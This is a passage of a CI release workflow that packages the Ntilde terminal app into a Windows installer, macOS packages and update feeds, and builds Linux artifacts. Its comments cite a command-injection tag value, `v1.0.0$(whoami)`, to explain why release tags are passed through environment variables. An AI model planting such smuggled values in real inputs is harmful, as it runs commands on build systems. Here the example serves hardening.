              throw "$debugLog has no line matching '$pattern', so the bundle started but its UI never finished coming up. A trimmed-away type reached only while building the terminal view, or a native that failed to load, looks exactly like this."
            }
          }

          Write-Output "Bundle started from a pristine profile, brought up its UI, and stayed up."
          Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue

      # win-x64 only. osx-arm64's user-facing zip is the Velopack Portable bundle
      # (Ntilde.app inside a ditto zip) built by the macOS Velopack steps below and
      # uploaded under this same ntilde-osx-arm64-<tag>.zip name; archiving the raw
      # publish directory too would ship a second, near-identical zip.
      #
      # `== 'win-x64'` rather than `!= 'osx-arm64'`: with linux-x64 moved to
      # publish_linux this matrix contains exactly {win-x64, osx-arm64}, so the two
      # conditions select the identical set - the rewrite is behaviour-preserving and
      # says what it means. Linux now builds a tar.gz instead (Compress-Archive
      # cannot write Unix mode bits, so the zip it replaces shipped a Ntilde
      # binary with no executable bit).
      - name: Archive bundle
        if: matrix.rid == 'win-x64'
        shell: pwsh
        # Same reasoning as the metadata job's env block, for PowerShell: in a double-quoted
        # string `"$(...)"` is a subexpression PowerShell EXECUTES, so a tag named
        # `v1.0.0$(whoami)` interpolated into script source runs commands on the runner.
        # Through env it is only ever data. (Codex P1 on #340.)
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RID: ${{ matrix.rid }}
        run: |
          $rid = $env:RID
          $tag = $env:RELEASE_TAG
          $source = "artifacts/publish/$rid"
          $dest = "artifacts/release/ntilde-$rid-$tag.zip"
          New-Item -ItemType Directory -Force -Path "artifacts/release" | Out-Null
          if (Test-Path $dest) { Remove-Item $dest -Force }
          Compress-Archive -Path "$source/*" -DestinationPath $dest

      # win-x64 only, and equivalent to the previous `!= 'osx-arm64'` for the same
      # reason as Archive bundle above: osx-arm64's zip uploads from the Velopack
      # output directory instead, and linux no longer runs in this job.
      - name: Upload release asset
        if: matrix.rid == 'win-x64'
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
          files: artifacts/release/ntilde-${{ matrix.rid }}-${{ needs.release_metadata.outputs.release_tag }}.zip

      # ---- Velopack installers + update feeds (#91). win-x64 and osx-arm64 only -
      # ---- Linux's AppImage, .deb, tarball and per-architecture update feeds are
      # ---- built and gated in publish_linux / release_linux below.
      #
      # The `|| matrix.rid == 'osx-arm64'` half of each guard below is now redundant
      # (the matrix holds nothing else), but it is left alone on purpose: rewriting
      # working, signed, notarized macOS steps for tidiness is risk with no return.
      - name: Install vpk
        if: matrix.rid == 'win-x64' || matrix.rid == 'osx-arm64'
        run: dotnet tool install -g vpk --version 1.2.0

      - name: Download previous Velopack release (for delta generation)
        id: velopack_download
        if: matrix.rid == 'win-x64' || matrix.rid == 'osx-arm64'
        continue-on-error: true
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          New-Item -ItemType Directory -Force -Path artifacts/velopack | Out-Null
          # First release on a channel, or no prior Velopack assets in that channel's feed:
          # nothing to download, and a full-only release is the correct outcome rather than
          # a failed one. The channel is resolved from the runner's OS (vpk's
          # DefaultName.GetDefaultChannel: win on windows-latest, osx on macos-latest), so
          # each lane only ever sees its own channel's packages even though the step body
          # is shared.
          vpk download github --repoUrl https://github.com/benyblack/ntilde --token $env:GH_TOKEN --outputDir artifacts/velopack

      - name: Pack Windows installer (Velopack)
        if: matrix.rid == 'win-x64'
        shell: pwsh
        # RELEASE_TAG/RELEASE_VERSION come through env, never interpolated into the script:
        # `"$(...)"` in a PowerShell double-quoted string is an executed subexpression, so a
        # tag named `v1.0.0$(whoami)` would run commands on the runner. (Codex P1 on #340.)
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
          DOWNLOAD_OUTCOME: ${{ steps.velopack_download.outcome }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          $ver = $env:RELEASE_VERSION
          $tag = $env:RELEASE_TAG

          # Whether a delta is EXPECTED has to be decided from GitHub, not from this
          # directory. An empty directory means two completely different things: "no prior
          # Velopack release exists" (legitimate, and the only correct outcome on the first
          # release) and "the download step failed" (a transient API error). The download step
          # is continue-on-error because the first case must not fail the release — which means
          # that without this query, a FAILED download looks exactly like a first release, no
          # assertion fires, and the release publishes full-only, permanently and silently
          # dropping delta updates for every client. Ask the releases API which case it is.
          # (Codex P2 on #340.)
          # The filter has to mirror what `vpk download github` itself will fetch, or this
          # query and that step disagree. It skips prereleases (the same GitHub flag
          # create_release sets from the tag's SemVer suffix) and drafts, so counting a beta's
          # full package here would demand a delta that vpk was never going to download —
          # blocking the first STABLE release after any prerelease. (Codex P2 on #340.)
          # It also excludes -osx-full.nupkg assets: the win channel's full packages have no
          # channel suffix (the suffix is only omitted for the default win channel), while
          # the osx channel's do — so a bare endswith("-full.nupkg") counts BOTH channels
          # once mac releases exist, demanding a win delta from a download that only ever
          # fetched the win feed.
          $priorFullRaw = gh api "repos/$env:GITHUB_REPOSITORY/releases?per_page=100" `
            --jq '[.[] | select(.tag_name != env.RELEASE_TAG) | select(.prerelease == false) | select(.draft == false) | .assets[]? | select(.name | endswith("-full.nupkg") and (endswith("-osx-full.nupkg") | not))] | length'

          # Check the exit code before trusting the output, and check it IMMEDIATELY - any
          # other command in between overwrites $LASTEXITCODE. GitHub's pwsh wrapper sets
          # $ErrorActionPreference = 'stop', but that governs cmdlet errors, not native exit
          # codes: a failing `gh` (1, 2 or 4 per `gh help exit-codes`) prints nothing to stdout
          # and does NOT terminate the script. `[int]$null` is 0, so without this the query
          # failing silently reads as "no prior release", $expectDelta goes false, and the
          # release publishes full-only - reinstating the exact silent-degradation hole this
          # query was added to close. (Codex P2 on #340.)
          if ($LASTEXITCODE -ne 0) {
            throw "Querying the releases API failed (gh exit code $LASTEXITCODE). Cannot tell a first release from a transient failure, and guessing wrong publishes a release with no delta. Re-run the workflow for this tag."
          }
          if ("$priorFullRaw" -notmatch '^\d+$') {
            throw "The releases API query returned '$priorFullRaw', which is not a count. Refusing to guess whether a delta is expected."
          }
          $priorFullCount = [int]$priorFullRaw
          $expectDelta = $priorFullCount -gt 0
          Write-Host "Prior full packages on GitHub (excluding $tag): $priorFullCount. Download step outcome: $env:DOWNLOAD_OUTCOME."

          if ($expectDelta -and $env:DOWNLOAD_OUTCOME -ne 'success') {
            throw "A prior Velopack release exists, but 'vpk download github' did not succeed (outcome: $env:DOWNLOAD_OUTCOME). Packing now would publish a full-only release and silently drop delta updates. Re-run the workflow for this tag once GitHub is reachable."
          }

          if ($expectDelta) {
            Write-Host "A delta is expected and will be asserted after packing."
          } else {
            Write-Host "No prior Velopack release; full-only output is the correct result."
          }

          # Make a re-run idempotent. `vpk download github` picks the max-version full out of
          # the union feed; for an already-published tag that is the tag's OWN
          # NtildeApp-$ver-full.nupkg, and `vpk pack` then hard-fails with
          # "[FTL] There is a release in channel win which is equal or greater to the current
          # version $ver". Because the portable zips upload in an earlier step, that leaves a
          # half-published release behind a red job. This workflow supports workflow_dispatch
          # re-runs by design, so dropping this version's own artifacts first is required, not
          # defensive.
          Get-ChildItem artifacts/velopack -Filter "NtildeApp-$ver-*.nupkg" -ErrorAction SilentlyContinue | Remove-Item -Force

          # --packId is deliberately NOT "ntilde" (the data folder name), and this must not be
          # "tidied" to match. Velopack installs to %LocalAppData%\<packId> and its uninstall
          # routine deletes that directory. Settings, themes, sessions and logs live in
          # %LocalAppData%\ntilde, and Windows paths are case-insensitive, so a packId of
          # "ntilde" or "Ntilde" makes the install root and the data root the same directory:
          # uninstall would wipe user data. "NtildeApp" keeps them apart.
          #
          # Only the nupkg file names and the install directory derive from packId; --packTitle
          # is what users see. Changing packId AFTER a stable release ships orphans every
          # installed client (a different packId is a different app to the updater), so the
          # NovaTerminalApp -> NtildeApp change at the rebrand was the one allowed break and
          # is documented in README "Coming from NovaTerminal".
          vpk pack `
            --packId NtildeApp `
            --packVersion $ver `
            --packDir artifacts/publish/win-x64 `
            --mainExe Ntilde.exe `
            --packTitle Ntilde `
            --packAuthors benyblack `
            --icon src/Ntilde.App/Assets/ntilde_icon.ico `
            --outputDir artifacts/velopack `
            --noPortable
          # --noPortable: the release already ships ntilde-win-x64-<tag>.zip, and two
          # near-identical zips on the releases page is a support question waiting to happen.

          # The installer's file name is ours to choose - nothing resolves it by name - so
          # give it one that reads clearly next to the zips. Matched by glob because vpk
          # includes the channel in the name it produces.
          $setup = Get-ChildItem artifacts/velopack -Filter "*Setup.exe" | Select-Object -First 1
          if (-not $setup) { throw "vpk pack produced no Setup.exe" }
          Move-Item $setup.FullName "artifacts/velopack/ntilde-Setup-win-x64-$tag.exe"

          Write-Host "Velopack output:"
          Get-ChildItem artifacts/velopack | Select-Object Name, Length | Format-Table

          # Assert here rather than at the upload step, which leaves
          # fail_on_unmatched_files at its permissive default - required, because the first
          # release legitimately produces no delta, so flipping it would break exactly the
          # case it is meant to protect. The signal belongs here instead, where "was a delta
          # expected?" is known from GitHub rather than guessed from an empty directory.
          if (-not (Test-Path "artifacts/velopack/NtildeApp-$ver-full.nupkg")) {
            throw "vpk pack produced no NtildeApp-$ver-full.nupkg - the update feed would be unusable."
          }
          if ($expectDelta -and -not (Test-Path "artifacts/velopack/NtildeApp-$ver-delta.nupkg")) {
            throw "A prior Velopack release exists but vpk pack produced no NtildeApp-$ver-delta.nupkg - delta generation silently failed."
          }

      # Known and benign: the uploaded releases.win.json lists the PREVIOUS release's full
      # nupkg too, which is not an asset on THIS release. `vpk pack` re-indexes the whole
      # output directory, and the previous full is in there because the download step put it
      # there for delta generation. Deleting it before packing would not help - by the time
      # the feed exists the entry is already inside it.
      #
      # Harmless because nothing on the happy path ever selects that entry:
      # CheckForUpdatesAsync takes the MAX version, so only a downgrade would reach a
      # non-latest full, and AllowVersionDowngrade is off. If something did select it,
      # GitBase.DownloadReleaseEntry resolves assets by name within the release the feed came
      # from and would throw "Could not find asset called '...' in GitHub Release '<tag>'" -
      # and that same asset resolves fine through its own release's feed, which is what
      # clients on the previous version are actually reading.
      #
      # The version-scoped globs below are what keep stale nupkgs from being re-UPLOADED onto
      # this release; do not broaden them to `NtildeApp-*.nupkg`.
      - name: Upload Windows installer and update feed
        if: matrix.rid == 'win-x64'
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
          files: |
            artifacts/velopack/ntilde-Setup-win-x64-${{ needs.release_metadata.outputs.release_tag }}.exe
            artifacts/velopack/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-full.nupkg
            artifacts/velopack/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-delta.nupkg
            artifacts/velopack/releases.win.json

      # ---- macOS installer + update feed. osx-arm64 only. vpk builds Ntilde.app
      # ---- from the raw publish directory (generated Info.plist, .icns into
      # ---- Contents/Resources, everything else into Contents/MacOS — which is what the
      # ---- app's AppContext.BaseDirectory resource lookups expect), a .pkg installer,
      # ---- full/delta nupkgs for the osx channel, and a ditto Portable zip of the .app.
      # ---- The osx channel suffix keeps every asset name distinct from the win lane's
      # ---- (the suffix is only omitted for the default win channel), so both lanes can
      # ---- upload into the same GitHub release without collisions.
      - name: Generate macOS app icon (.icns)
        if: matrix.rid == 'osx-arm64'
        run: packaging/macos/make-icns.sh src/Ntilde.App/Assets/ntilde_icon.png artifacts/icon/ntilde_icon.icns

      - name: Pack macOS installer (Velopack)
        if: matrix.rid == 'osx-arm64'
        shell: bash
        # Same rule as every other script in this file: the tag and version reach the
        # script through env, never by interpolation into its source. (Codex P1 on #340.)
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
          DOWNLOAD_OUTCOME: ${{ steps.velopack_download.outcome }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Signing reaches the script through env like everything else: the identity
          # strings contain spaces and parentheses, so they must never be interpolated
          # into script source. When the keychain step was skipped these are empty and
          # the MAC_SIGNING guard below leaves vpk unsigned, exactly as before.
          MAC_SIGNING: ${{ steps.mac_signing.outputs.imported }}
          MAC_SIGN_KEYCHAIN: ${{ steps.mac_signing.outputs.keychain }}
          MAC_SIGN_APP_IDENTITY: ${{ secrets.MAC_SIGN_APP_IDENTITY }}
          MAC_SIGN_INSTALL_IDENTITY: ${{ secrets.MAC_SIGN_INSTALL_IDENTITY }}
          MAC_NOTARY_PROFILE: ${{ secrets.MAC_NOTARY_PROFILE }}
        run: |
          set -euo pipefail
          ver="$RELEASE_VERSION"
          tag="$RELEASE_TAG"

          # Same disambiguation as the Windows lane (see its long comment): an empty
          # artifacts/velopack directory is either "no prior Velopack osx release"
          # (legitimate — the only correct outcome on the first mac release) or "the
          # download step failed" (transient). Ask the releases API which case it is.
          # The filter mirrors what `vpk download github` fetches for the osx channel:
          # prereleases and drafts excluded, and only -osx-full.nupkg assets counted —
          # the win lane's full packages (no channel suffix) must not be counted here,
          # or this lane would demand a delta its download never fetched.
          if ! prior_full_raw=$(gh api "repos/$GITHUB_REPOSITORY/releases?per_page=100" \
              --jq '[.[] | select(.tag_name != env.RELEASE_TAG) | select(.prerelease == false) | select(.draft == false) | .assets[]? | select(.name | endswith("-osx-full.nupkg"))] | length'); then
            echo "Querying the releases API failed (gh exit code $?). Cannot tell a first mac release from a transient failure, and guessing wrong publishes a release with no delta. Re-run the workflow for this tag." >&2
            exit 1
          fi
          if [[ ! "$prior_full_raw" =~ ^[0-9]+$ ]]; then
            echo "The releases API query returned '$prior_full_raw', which is not a count. Refusing to guess whether a delta is expected." >&2
            exit 1
          fi
          prior_full_count=$((prior_full_raw))
          expect_delta=$(( prior_full_count > 0 ? 1 : 0 ))
          echo "Prior osx full packages on GitHub (excluding $tag): $prior_full_count. Download step outcome: $DOWNLOAD_OUTCOME."

          if (( expect_delta )) && [[ "$DOWNLOAD_OUTCOME" != "success" ]]; then
            echo "A prior Velopack osx release exists, but 'vpk download github' did not succeed (outcome: $DOWNLOAD_OUTCOME). Packing now would publish a full-only release and silently drop delta updates. Re-run the workflow for this tag once GitHub is reachable." >&2
            exit 1
          fi
          if (( expect_delta )); then
            echo "A delta is expected and will be asserted after packing."
          else
            echo "No prior Velopack osx release; full-only output is the correct result."
          fi

          # Same re-run idempotency as the Windows lane: `vpk download github` picks the
          # max-version osx full, which for an already-published tag is the tag's OWN
          # NtildeApp-$ver-osx-full.nupkg — and `vpk pack` then hard-fails with
          # "There is a release in channel osx which is equal or greater to the current
          # version". Drop this version's own artifacts first.
          rm -f artifacts/velopack/NtildeApp-"$ver"-osx-*.nupkg

          # packId matches the Windows lane deliberately: it is the updater's application
          # identity. On macOS it only names the update cache
          # (~/Library/Caches/velopack/NtildeApp); the app itself installs as
          # /Applications/Ntilde.app, so the Windows case-insensitivity hazard (a packId of
          # "ntilde" or "Ntilde" colliding with the %LocalAppData%\ntilde data folder) does
          # not apply here - macOS's filesystem is case-sensitive. --bundleId: vpk's default
          # would be com.benyblack.NtildeApp; this matches the public identity (winget:
          # benyblack.ntilde) instead.
          #
          # Signing is secret-gated (the keychain is set up at the top of this job):
          # when that step ran, vpk signs the app bundle and dylibs (deep signing), signs
          # the pkg, submits for notarization, staples the ticket, and runs spctl
          # assessments — failing the step if any of that breaks. Without the secret, vpk
          # warns "Package will not be signed or notarized" and packages everything
          # unsigned; the app still runs, because on arm64 the linker ad-hoc-signs the
          # AOT binary and the Rust dylibs. Details: packaging/macos/README.md.
          #
          # StripSymbols=true leaves a ~94 MB Ntilde.dSYM beside the binary (3x the
          # binary's own size). Delete it at the source AND exclude it in vpk: deletion
          # keeps empty dSYM directory skeletons out of the bundle entirely, --exclude
          # (vpk's built-in default exclusion only covers Windows .pdb files) is
          # defense-in-depth. Nothing else consumes the symbols - the raw publish-dir zip
          # this dSYM used to ship in no longer exists for macOS.
          rm -rf artifacts/publish/osx-arm64/Ntilde.dSYM
          # The +guarded expansion keeps an empty array valid under set -u even if the
          # runner resolves shell: bash to macOS's 3.2 /bin/bash.
          sign_args=()
          if [[ "${MAC_SIGNING:-}" == "1" ]]; then
            sign_args+=(
              --signAppIdentity "$MAC_SIGN_APP_IDENTITY"
              --signInstallIdentity "$MAC_SIGN_INSTALL_IDENTITY"
              --notaryProfile "$MAC_NOTARY_PROFILE"
              --keychain "$MAC_SIGN_KEYCHAIN"
            )
          fi
          vpk pack \
            --packId NtildeApp \
            --packVersion "$ver" \
            --packDir artifacts/publish/osx-arm64 \
            --mainExe Ntilde \
            --packTitle Ntilde \
            --packAuthors benyblack \
            --bundleId com.benyblack.Ntilde \
            --icon artifacts/icon/ntilde_icon.icns \
            --exclude 'Ntilde\.dSYM' \
            --outputDir artifacts/velopack \
            ${sign_args[@]+"${sign_args[@]}"}

          # The installer's and the zip's file names are ours to choose — nothing
          # resolves them by name. The zip keeps the exact name the raw publish
          # directory used to ship under, so existing download links keep working;
          # its content is now the Ntilde.app bundle instead of loose files.
          # Matched by glob because vpk includes the channel in the names it produces.
          setup_pkg=$(ls artifacts/velopack/*-osx-Setup.pkg 2>/dev/null | head -n 1 || true)
          if [[ -z "$setup_pkg" ]]; then
            echo "vpk pack produced no -osx-Setup.pkg" >&2
            exit 1
          fi
          mv "$setup_pkg" "artifacts/velopack/ntilde-Setup-osx-arm64-$tag.pkg"

          portable_zip=$(ls artifacts/velopack/*-osx-Portable.zip 2>/dev/null | head -n 1 || true)
          if [[ -z "$portable_zip" ]]; then
            echo "vpk pack produced no -osx-Portable.zip" >&2
            exit 1
          fi
          mv "$portable_zip" "artifacts/velopack/ntilde-osx-arm64-$tag.zip"

          echo "Velopack output:"
          ls -l artifacts/velopack

          # Assert here rather than at the upload step, for the same reason as the
          # Windows lane: the first mac release legitimately produces no delta, so
          # fail_on_unmatched_files must stay permissive and the signal belongs here.
          if [[ ! -f "artifacts/velopack/NtildeApp-$ver-osx-full.nupkg" ]]; then
            echo "vpk pack produced no NtildeApp-$ver-osx-full.nupkg - the osx update feed would be unusable." >&2
            exit 1
          fi
          if (( expect_delta )) && [[ ! -f "artifacts/velopack/NtildeApp-$ver-osx-delta.nupkg" ]]; then
            echo "A prior Velopack osx release exists but vpk pack produced no NtildeApp-$ver-osx-delta.nupkg - delta generation silently failed." >&2
            exit 1
          fi

      # Same known-and-benign property as the win feed: releases.osx.json lists the
      # previous release's full nupkg too (the download step placed it in the output
      # directory for delta generation and `vpk pack` re-indexes everything). The
      # version-scoped paths below keep stale nupkgs from being re-uploaded onto this
      # release.
      - name: Upload macOS installer and update feed
        if: matrix.rid == 'osx-arm64'
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
          files: |
            artifacts/velopack/ntilde-Setup-osx-arm64-${{ needs.release_metadata.outputs.release_tag }}.pkg
            artifacts/velopack/ntilde-osx-arm64-${{ needs.release_metadata.outputs.release_tag }}.zip
            artifacts/velopack/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-osx-full.nupkg
            artifacts/velopack/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-osx-delta.nupkg
            artifacts/velopack/releases.osx.json

  # ===========================================================================
  # Linux release lane (#91): AppImage + .deb + tarball + per-architecture update
  # feeds, for linux-x64 and linux-arm64.
  #
  # TWO JOBS, and the split is load-bearing - do not merge them back together.
  #
  #   publish_linux (container: ubuntu:22.04) produces every artifact and PUBLISHES
  #   NOTHING. release_linux (plain runner) runs the docker smoke gate against those
  #   artifacts and only then uploads them to the release.
  #
  # WHY. packaging/linux/smoke-test.sh `docker run`s pristine containers itself -
  # that IS the test (a machine that installs nothing but the .deb). A `container:`
  # job has no docker daemon and no socket, so docker-in-docker is unavailable;
  # mounting the host socket would be privilege escalation AND would break the
  # script's own `-v "$dir:/art:ro"` mounts, because a path inside the job container
  # does not exist on the daemon's host. So the gate stays on the runner and receives
  # the artifacts through upload/download-artifact. ci.yml's linux_packaging_* lane
  # made the identical split for the identical reason.
  #
  # ORDERING IS THE POINT OF THIS REWRITE. The lane this replaces uploaded
  # ntilde-linux-x64-<tag>.zip from publish_aot's `Upload release asset` step -
  # before anything had packed, let alone launched, anything. Now every asset for a
  # given architecture is produced, asserted, and smoke-launched in a bare
  # ubuntu:22.04 container before a single byte reaches the release.
  #
  # Artifact permissions are not preserved by upload/download-artifact. Harmless
  # here: the .tar.gz and the .deb carry their own internal modes (and the tarball's
  # exec bit is asserted below, in the job that creates it, before upload), and
  # smoke-test.sh already does its own `chmod +x` on the AppImage copy it launches.
  # An AppImage downloaded from a GitHub release needs chmod +x regardless - HTTP has
  # no mode bits.
  #
  # CROSS-ARCHITECTURE COUPLING, stated openly: `needs: publish_linux` waits on the
  # WHOLE matrix, so a failing linux-arm64 leg keeps linux-x64's proven assets off the
  # release even though `fail-fast: false` still builds them. GitHub offers no per-leg
  # `needs`.
  #
  # WINDOWS AND MACOS *DO* DEPEND ON build_native_linux - TRANSITIVELY. Be precise
  # about this, because an earlier version of this comment claimed the opposite and it
  # was wrong. The edge is:
  #
  #   build_native_linux -> release_tests -> publish_aot -> (win .zip / Setup.exe /
  #                                                          win feed; osx .pkg /
  #                                                          .zip / osx feed)
  #
  # release_tests `needs: [release_metadata, build_native, build_native_linux]` because
  # the ubuntu legs' native-* artifacts come from that job, and publish_aot - which
  # builds and uploads every Windows and macOS asset - `needs: release_tests`. So a
  # plain job failure anywhere in build_native_linux skips release_tests, skips
  # publish_aot, and publishes nothing for two platforms that ship today and are not
  # part of this change.
  #
  # THE TWO `continue-on-error` LINES THAT USED TO DECOUPLE THEM ARE GONE - one on
  # build_native_linux (`matrix.rid == 'linux-arm64'`), one on release_tests
  # (`matrix.os == 'ubuntu-24.04-arm'`) - removed together once v0.7.0-rc.1
  # (release run 33740981976) proved the whole arm64 chain green with real
  # published assets. That was the documented condition for removing them, and it
  # is now met.
  #
  # BEHAVIOUR NOW WHEN THE ARM64 NATIVE BUILD FAILS FOR REAL - this is the
  # deliberate, accepted trade of having proven the lane, not an oversight:
  #   - build_native_linux's arm64 leg fails the job outright (no more advisory
  #     tolerance), even though `fail-fast: false` lets its linux-x64 sibling
  #     finish.
  #   - release_tests is SKIPPED (`needs: [..., build_native_linux]`).
  #   - publish_aot is SKIPPED (`needs: [..., release_tests]`), so Windows and
  #     macOS publish NOTHING - the exact outcome the two removed lines existed
  #     to prevent while the lane was unproven.
  #   - publish_linux is SKIPPED too (`needs: [..., build_native_linux,
  #     release_tests]`), so release_linux is skipped and no Linux assets reach
  #     the release either, not even linux-x64's, which may have built fine.
  # In short: a Linux native failure now withholds every platform's assets again,
  # the same as any other leg's failure would. That is accepted because the
  # arm64 lane has demonstrated it works, not because the risk of a regression
  # has gone away.
  #
  # RECOVERY, and read this before assuming a re-run fixes it. Two genuinely different
  # situations:
  #
  #   (a) A TRANSIENT arm64 failure. "Re-run failed jobs" is correct and sufficient:
  #       it replays the same workflow file, and a clean re-run publishes normally
  #       for every platform.
  #
  #   (b) The arm64 lane is BROKEN and needs a real fix, or needs decoupling again
  #       (for example by re-adding a `continue-on-error` line, or by removing the
  #       arm64 entries from build_native_linux, release_tests, publish_linux, and
  #       release_linux). Editing the workflow file does NOT take effect on a
  #       re-run: GitHub re-runs replay the workflow file AS OF THE TRIGGERING
  #       REF, so a tag push replays the file at that tag no matter what main now
  #       says. Applying either fix therefore requires EITHER a new tag on the
  #       fixed commit, OR `workflow_dispatch` with `tag_name` set to the existing
  #       tag from an updated default branch - the dispatch path reads the
  #       workflow from the default branch, which is what makes the edit apply.
  #       Until one of those happens, nothing publishes for any platform.
  #
  # Either way, NOT by making the smoke gate - or the arm64 gate generally - non-blocking
  # without a proven reason to.
  # ===========================================================================
  publish_linux:
    name: Publish Linux (${{ matrix.rid }})
    runs-on: ${{ matrix.os }}
    # The glibc floor, identical to build_native_linux's - see that job's comment for
    # why this is a container tag rather than a `runs-on: ubuntu-22.04` label.
    container:
      image: ubuntu:22.04
    # Same fix as build_native_linux above: a `container:` job's inline `run:`
    # blocks run under `sh` (dash), not bash, unless declared here. This job's
    # steps lean on `pipefail`, `<<<`, `[[ ]]`, `$(( ))` arithmetic and substring
    # expansion throughout - all bash-only, none of it dash-compatible.
    defaults:
      run:
        shell: bash
    # 60, matching ci.yml's equivalent: cold apt install + SDK download + full NuGet
    # restore + AOT publish + build-deb.sh + vpk pack, with no preinstalled anything
    # to fall back on. Not 90 like publish_aot - there is no notarization wait here.
    timeout-minutes: 60
    needs: [release_metadata, create_release, build_native_linux, release_tests]
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-latest
            rid: linux-x64
            debarch: amd64
          # UNVERIFIED end to end: no arm64 build of this project has ever run, and
          # whether `vpk` can produce an AppImage on linux-arm64 has been open since
          # the opening spike (the development machine has no arm64 emulation).
          # Documented contingency if `vpk pack` turns out to be x64-only: vpk's
          # `[linux] pack --runtime linux-arm64` cross-pack from the x64 leg. Not
          # implemented speculatively - it would replace a real per-architecture
          # build with an untested cross-build to fix a problem that may not exist.
          - os: ubuntu-24.04-arm
            rid: linux-arm64
            debarch: arm64
    steps:
      # MUST precede actions/checkout (no git -> checkout silently degrades to a REST
      # tarball with no .git). List is identical to build_native_linux's; per-package
      # rationale is in ci.yml's linux_packaging_build. jq is the one addition beyond
      # ci.yml's list - the prior-release query below needs it, and `gh` is NOT an
      # option: it lives on the runner host, not inside this container.
      - name: Install container toolchain
        run: |
          set -euo pipefail
          export DEBIAN_FRONTEND=noninteractive
          apt-get update
          apt-get install -y \
            ca-certificates curl git unzip zstd jq \
            clang zlib1g-dev binutils file imagemagick squashfs-tools \
            fontconfig libfreetype6 x11-utils \
            libicu70 libssl3
          echo "--- container identity (the glibc floor this lane pins) ---"
          head -2 /etc/os-release
          # Captured, not piped into `head`: ldd's version script emits its
          # lines via separate writes, so `| head -1` can close the pipe
          # while ldd is still writing and take SIGPIPE under `pipefail` -
          # the exact hazard ci.yml's identical diagnostic hit in CI run
          # 33669171961. sed selects line 1 from the already-complete string,
          # with nothing left upstream to starve.
          sed -n '1p' <<<"$(ldd --version)"
          # build-deb.sh preflights these and fails loudly without them; assert here
          # so a failure names the missing package instead of the script.
          for t in dpkg-deb dpkg-query file ldd strip convert mksquashfs unzip jq; do
            command -v "$t" >/dev/null || { echo "missing required tool: $t" >&2; exit 1; }
          done

      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      # Unlike the hosted runner image, the container has no preinstalled SDK to fall
      # back on, so the ~220 MB SDK tarball download is cached on global.json.
      # Keyed per architecture: the payload is a different RID's SDK on each leg.
      - name: Cache .NET SDK
        if: needs.release_metadata.outputs.cache_trusted == 'true'
        uses: actions/cache@v4
        with:
          path: ~/.dotnet
          key: dotnet-sdk-container-ubuntu2204-${{ matrix.rid }}-${{ hashFiles('global.json') }}
          restore-keys: dotnet-sdk-container-ubuntu2204-${{ matrix.rid }}-

      # actions/setup-dotnet (used by the win/osx jobs above) is deliberately not used
      # here: it is a node action that shells out to dotnet-install.sh, so it would
      # add a layer whose behaviour in a bare container is unproven to gain only its
      # NuGet cache - which is one actions/cache block below.
      #
      # dotnet-install.sh is not used either, and that IS a change: this step used to
      # `curl` it from the dot.net redirector and execute it. Transport was hardened
      # (`--proto '=https' --tlsv1.2`) but the content never was - so THIS LANE, the
      # one that produces the artifacts users install, executed mutable remote script
      # content before compiling them. That is exactly the property the pinned,
      # checksum-verified rustup bootstrap earlier in this file was changed to remove;
      # leaving the SDK bootstrap unverified made that fix inconsistent with itself.
      # Now: fetch the SDK tarball and its published .sha512 sidecar, verify, then
      # extract. Nothing downloaded is executed before it has been verified.
      #
      # The version is READ OUT OF global.json (jq), never a literal, so this cannot
      # drift from the pin the other jobs use via setup-dotnet's global-json-file
      # input - that was the whole reason the old code passed `--jsonfile global.json`.
      # Behaviour difference worth stating: dotnet-install.sh --jsonfile honoured
      # `rollForward: latestPatch` and could therefore install a NEWER 10.0.4xx patch
      # than the pin names, while this installs exactly `sdk.version`. That is
      # strictly more reproducible, matches the actions/cache key above (which is
      # hashFiles('global.json')), and global.json's rollForward still governs which
      # installed SDK `dotnet build` selects.
      #
      # Per-arch by `uname -m`: this job's matrix has a linux-arm64 leg on
      # ubuntu-24.04-arm, where uname -m reports aarch64. An unrecognised
      # architecture is a hard error, not a silent fallthrough to the x64 payload.
      - name: Install .NET SDK (version pinned by global.json)
        run: |
          set -euo pipefail
          sdk_version="$(jq -re '.sdk.version' global.json)"
          case "$(uname -m)" in
            x86_64)  sdk_rid=linux-x64 ;;
            aarch64) sdk_rid=linux-arm64 ;;
            *) echo "no pinned .NET SDK download for architecture $(uname -m)" >&2; exit 1 ;;
          esac
          tarball="dotnet-sdk-${sdk_version}-${sdk_rid}.tar.gz"
          base_url="https://builds.dotnet.microsoft.com/dotnet/Sdk/${sdk_version}"
          if [[ -d "$HOME/.dotnet/sdk/$sdk_version" ]]; then
            # actions/cache above restored it; the old script self-no-opped here.
            echo "SDK $sdk_version already present in \$HOME/.dotnet (cache hit); skipping download"
          else
            curl --proto '=https' --tlsv1.2 -sSfL -o "/tmp/$tarball"        "$base_url/$tarball"
            curl --proto '=https' --tlsv1.2 -sSfL -o "/tmp/$tarball.sha512" "$base_url/$tarball.sha512"
            # NOT `sha512sum -c`: the sidecar's shape is not contractual across
            # .NET's download hosts. builds.dotnet.microsoft.com currently serves the
            # two-column "<hash>  <filename>" form, but the older dotnetcli.* CDN
